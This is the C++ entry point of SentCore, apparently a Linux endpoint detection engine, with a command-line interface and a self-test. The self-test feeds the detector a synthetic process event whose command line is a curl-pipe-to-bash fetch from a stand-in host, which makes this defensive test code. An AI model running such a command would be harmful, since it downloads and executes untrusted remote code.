#include <cstdlib>
#include <iostream>
#include <string_view>

#include <sentcore/core/agent.hpp>
#include <sentcore/core/event.hpp>
#include <sentcore/detection/detection_engine.hpp>
#include <sentcore/version.hpp>

namespace
{

void print_help()
{
    std::cout << "SentCore " << sentcore::kVersion << "\n"
              << "High-performance Linux endpoint detection engine\n\n"
              << "Usage:\n"
              << "  sentcore monitor      Start host monitoring\n"
              << "  sentcore self-test    Run built-in detection checks\n"
              << "  sentcore version      Print version\n"
              << "  sentcore help         Show this help\n";
}

int run_self_test()
{
    sentcore::DetectionEngine detector{};
    sentcore::Event event{};
    event.sequence = 1U;
    event.timestamp_ns = sentcore::now_unix_ns();
    event.source = sentcore::EventSource::Internal;

    auto& process = event.emplace_process();
    process.pid = 4242;
    process.executable.assign("/tmp/payload");
    process.command.assign("curl https://example.invalid/payload.sh | bash");

    const auto batch = detector.evaluate(event);
    if (batch.count < 2U)
    {
        std::cerr << "Self-test failed: expected at least two detections, got " << batch.count << '\n';
        return EXIT_FAILURE;
    }

    std::cout << "Self-test passed: " << batch.count << " detections generated.\n";
    return EXIT_SUCCESS;
}

} // namespace

int main(int argc, char** argv)
{
    const std::string_view command = argc > 1 ? std::string_view(argv[1]) : "help";

    if (command == "monitor")
    {
        sentcore::Agent agent(sentcore::AgentOptions{});
        return agent.run();
    }

    if (command == "self-test")
    {
        return run_self_test();
    }

    if (command == "version" || command == "--version" || command == "-v")
    {
        std::cout << "SentCore " << sentcore::kVersion << '\n';
        return EXIT_SUCCESS;
    }

    if (command == "help" || command == "--help" || command == "-h")
    {
        print_help();
        return EXIT_SUCCESS;
    }

    std::cerr << "Unknown command: " << command << "\n\n";
    print_help();
    return EXIT_FAILURE;
}